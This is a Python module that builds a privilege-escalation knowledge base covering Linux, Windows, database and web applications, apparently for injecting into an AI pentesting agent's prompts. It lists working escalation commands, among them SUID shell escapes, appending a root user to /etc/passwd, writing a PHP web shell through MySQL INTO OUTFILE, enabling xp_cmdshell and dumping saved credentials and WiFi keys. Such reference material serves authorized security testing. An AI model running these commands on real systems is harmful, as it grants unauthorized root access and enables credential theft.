"""Privilege escalation knowledge base.

Deep knowledge about privilege escalation:
1. Linux privilege escalation
2. Windows privilege escalation
3. Docker/container privilege escalation
4. Database privilege escalation
5. Application privilege escalation
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class PrivescPattern:
    """A privilege escalation pattern."""
    pattern_id: str = ""
    name: str = ""
    platform: str = ""
    severity: str = "high"
    mitre_technique: str = ""
    description: str = ""
    testing_methodology: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "platform": self.platform[:10],
        }


PRIVESC_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "pe-001", "name": "Linux Privilege Escalation",
        "platform": "linux", "severity": "critical",
        "mitre": "T1068",
        "desc": "Linux local privilege escalation techniques.",
        "testing": (
            "LINUX PRIVILEGE ESCALATION:\n"
            "1. ENUMERATION:\n"
            "   - System info:\n"
            "     uname -a\n"
            "     cat /etc/os-release\n"
            "     cat /proc/version\n"
            "   - Current user:\n"
            "     id\n"
            "     whoami\n"
            "     sudo -l (check sudo permissions)\n"
            "   - Automated enumeration:\n"
            "     ./linpeas.sh\n"
            "     ./linux-exploit-suggester.sh\n"
            "2. SUID/SGID BINARIES:\n"
            "   - Find SUID: find / -perm -4000 2>/dev/null\n"
            "   - Find SGID: find / -perm -2000 2>/dev/null\n"
            "   - GTFOBins lookup for each SUID binary\n"
            "   - Common exploitable SUID:\n"
            "     * find: find . -exec /bin/bash -p \\;\n"
            "     * vim: vim -c ':!/bin/bash'\n"
            "     * python: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
            "     * nmap (old): nmap --interactive → !sh\n"
            "     * pkexec: CVE-2021-4034 (PwnKit)\n"
            "3. SUDO ABUSE:\n"
            "   - sudo -l (list allowed commands)\n"
            "   - GTFOBins for each allowed command\n"
            "   - sudo with LD_PRELOAD:\n"
            "     If env_keep += LD_PRELOAD\n"
            "   - sudo with LD_LIBRARY_PATH\n"
            "   - CVE-2021-3156 (Baron Samedit)\n"
            "4. CRON JOBS:\n"
            "   - cat /etc/crontab\n"
            "   - ls -la /etc/cron.d/\n"
            "   - Writable cron scripts\n"
            "   - Wildcard injection in cron commands\n"
            "   - PATH abuse in cron\n"
            "5. WRITABLE FILES:\n"
            "   - /etc/passwd writable:\n"
            "     echo 'root2:$(openssl passwd pass):0:0::/root:/bin/bash' >> /etc/passwd\n"
            "   - /etc/shadow readable → crack hashes\n"
            "   - Writable service files\n"
            "   - Writable PATH directories\n"
            "6. KERNEL EXPLOITS:\n"
            "   - Dirty Pipe (CVE-2022-0847): Linux 5.8+\n"
            "   - Dirty COW (CVE-2016-5195): Linux <4.8.3\n"
            "   - PwnKit (CVE-2021-4034): pkexec in polkit\n"
            "   - linux-exploit-suggester.sh\n"
            "7. CAPABILITIES:\n"
            "   - getcap -r / 2>/dev/null\n"
            "   - cap_setuid on python/perl/node → root shell\n"
            "   - cap_dac_read_search → read any file\n"
            "   - cap_net_raw → packet capture"
        ),
        "tools": ["linpeas", "linux-exploit-suggester", "GTFOBins"],
    },
    {
        "id": "pe-002", "name": "Windows Privilege Escalation",
        "platform": "windows", "severity": "critical",
        "mitre": "T1068",
        "desc": "Windows local privilege escalation techniques.",
        "testing": (
            "WINDOWS PRIVILEGE ESCALATION:\n"
            "1. ENUMERATION:\n"
            "   - System info:\n"
            "     systeminfo\n"
            "     whoami /priv\n"
            "     whoami /groups\n"
            "   - Automated:\n"
            "     winPEAS.exe\n"
            "     PowerUp.ps1\n"
            "     Seatbelt.exe\n"
            "2. TOKEN PRIVILEGES:\n"
            "   - SeImpersonatePrivilege (service accounts):\n"
            "     * JuicyPotato (Win<2019)\n"
            "     * PrintSpoofer\n"
            "     * GodPotato\n"
            "     * SweetPotato\n"
            "   - SeBackupPrivilege:\n"
            "     * Copy SAM/SYSTEM hives\n"
            "     * robocopy /b\n"
            "   - SeRestorePrivilege:\n"
            "     * Replace system files\n"
            "   - SeDebugPrivilege:\n"
            "     * Inject into system processes\n"
            "3. SERVICE EXPLOITATION:\n"
            "   - Unquoted service paths:\n"
            "     wmic service get name,pathname | findstr /i /v \"C:\\Windows\"\n"
            "   - Writable service binaries:\n"
            "     icacls {service_path}\n"
            "   - Service DLL hijacking:\n"
            "     Procmon → filter DLL NOT FOUND\n"
            "   - Service registry permissions:\n"
            "     accesschk.exe /accepteula -kvuqsw hklm\\system\\currentcontrolset\\services\n"
            "4. REGISTRY:\n"
            "   - AlwaysInstallElevated:\n"
            "     reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "     reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "     If both = 1 → msfvenom MSI payload\n"
            "   - Autologon credentials:\n"
            "     reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n"
            "5. SCHEDULED TASKS:\n"
            "   - schtasks /query /fo LIST /v\n"
            "   - Writable task scripts\n"
            "   - Task binaries in writable directories\n"
            "6. CREDENTIAL HARVESTING:\n"
            "   - Saved credentials:\n"
            "     cmdkey /list\n"
            "     runas /savecred /user:admin cmd\n"
            "   - Unattend.xml / sysprep files:\n"
            "     findstr /si password *.xml *.ini *.txt\n"
            "   - WiFi passwords:\n"
            "     netsh wlan show profiles\n"
            "     netsh wlan show profile {name} key=clear\n"
            "7. UAC BYPASS:\n"
            "   - fodhelper.exe\n"
            "   - eventvwr.exe\n"
            "   - sdclt.exe\n"
            "   - UACME project: 70+ methods"
        ),
        "tools": ["winPEAS", "PowerUp", "Seatbelt", "GodPotato", "PrintSpoofer"],
    },
    {
        "id": "pe-003", "name": "Database Privilege Escalation",
        "platform": "database", "severity": "high",
        "mitre": "T1078",
        "desc": "Database privilege escalation.",
        "testing": (
            "DATABASE PRIVILEGE ESCALATION:\n"
            "1. MYSQL:\n"
            "   - UDF (User Defined Functions):\n"
            "     Create shared library with system() function\n"
            "     select @@plugin_dir;\n"
            "     CREATE FUNCTION sys_exec RETURNS STRING SONAME 'raptor_udf2.so';\n"
            "     SELECT sys_exec('id');\n"
            "   - File read/write:\n"
            "     SELECT LOAD_FILE('/etc/passwd');\n"
            "     SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';\n"
            "   - Check: SELECT @@secure_file_priv;\n"
            "2. POSTGRESQL:\n"
            "   - COPY command:\n"
            "     COPY (SELECT '') TO PROGRAM 'id';\n"
            "   - Large Objects:\n"
            "     SELECT lo_import('/etc/passwd');\n"
            "   - Extension exploit:\n"
            "     CREATE EXTENSION IF NOT EXISTS dblink;\n"
            "     SELECT dblink_connect(...);\n"
            "3. MSSQL:\n"
            "   - xp_cmdshell:\n"
            "     EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n"
            "     EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
            "     EXEC xp_cmdshell 'whoami';\n"
            "   - Linked servers:\n"
            "     EXEC sp_linkedservers;\n"
            "     SELECT * FROM OPENQUERY(linked_server, 'SELECT @@version');\n"
            "   - Impersonation:\n"
            "     EXECUTE AS LOGIN = 'sa';\n"
            "4. ORACLE:\n"
            "   - Java privilege escalation:\n"
            "     GRANT JAVAUSERPRIV TO user;\n"
            "   - DBMS_SCHEDULER for OS commands\n"
            "   - UTL_FILE for file access"
        ),
        "tools": ["sqlmap --os-shell", "sqsh", "mssqlclient.py"],
    },
    {
        "id": "pe-004", "name": "Application Privilege Escalation",
        "platform": "application", "severity": "high",
        "mitre": "T1078",
        "desc": "Application-level privilege escalation.",
        "testing": (
            "APPLICATION PRIVILEGE ESCALATION:\n"
            "1. ROLE MANIPULATION:\n"
            "   - Parameter tampering:\n"
            "     POST body: role=admin, is_admin=true\n"
            "   - JWT claims modification:\n"
            "     Decode → Change 'role': 'user' → 'admin' → Re-encode\n"
            "   - Cookie manipulation:\n"
            "     Set-Cookie: role=admin\n"
            "2. IDOR:\n"
            "   - Horizontal escalation:\n"
            "     /api/users/123/settings → /api/users/456/settings\n"
            "   - Vertical escalation:\n"
            "     /api/user/profile → /api/admin/settings\n"
            "   - Object reference in body:\n"
            "     {\"user_id\": 456} (change to another user)\n"
            "3. FORCED BROWSING:\n"
            "   - Admin panels:\n"
            "     /admin, /administrator, /manage, /dashboard\n"
            "   - Debug endpoints:\n"
            "     /debug, /console, /actuator, /_debug\n"
            "   - API versioning:\n"
            "     /api/v1/admin (old, less secured)\n"
            "4. FUNCTION LEVEL:\n"
            "   - HTTP method override:\n"
            "     X-HTTP-Method-Override: DELETE\n"
            "     X-Method-Override: PUT\n"
            "   - Content-Type switch:\n"
            "     application/json → application/xml (XXE)\n"
            "5. MULTI-STEP:\n"
            "   - Skip approval steps in workflows\n"
            "   - Replay successful authorization tokens\n"
            "   - Race condition on privilege grant\n"
            "   - TOCTOU (Time-of-check to time-of-use)"
        ),
        "tools": ["Burp Suite", "ffuf", "jwt_tool", "Autorize (Burp extension)"],
    },
]


class PrivescKB:
    """Privilege escalation knowledge base.

    Provides privilege escalation methodology
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, PrivescPattern] = {}
        self._log = logger.bind(component="privesc_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load privilege escalation patterns."""
        for data in PRIVESC_PATTERNS:
            pattern = PrivescPattern(
                pattern_id=data["id"],
                name=data["name"],
                platform=data.get("platform", ""),
                severity=data.get("severity", "high"),
                mitre_technique=data.get("mitre", ""),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_patterns_for_platform(
        self,
        platform: str,
    ) -> list[PrivescPattern]:
        """Get patterns by platform."""
        return [
            p for p in self._patterns.values()
            if p.platform == platform
        ]

    def build_privesc_prompt(
        self,
        platforms: list[str] | None = None,
        max_patterns: int = 3,
    ) -> str:
        """Build privilege escalation prompt."""
        lines = ["## Privilege Escalation\n"]
        count = 0
        for pattern in self._patterns.values():
            if platforms and pattern.platform not in platforms:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            if pattern.mitre_technique:
                lines.append(f"MITRE: {pattern.mitre_technique}")
            lines.append(pattern.testing_methodology)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        plat_counts: dict[str, int] = defaultdict(int)
        for p in self._patterns.values():
            plat_counts[p.platform] += 1
        return {
            "patterns": len(self._patterns),
            "by_platform": dict(plat_counts),
        }
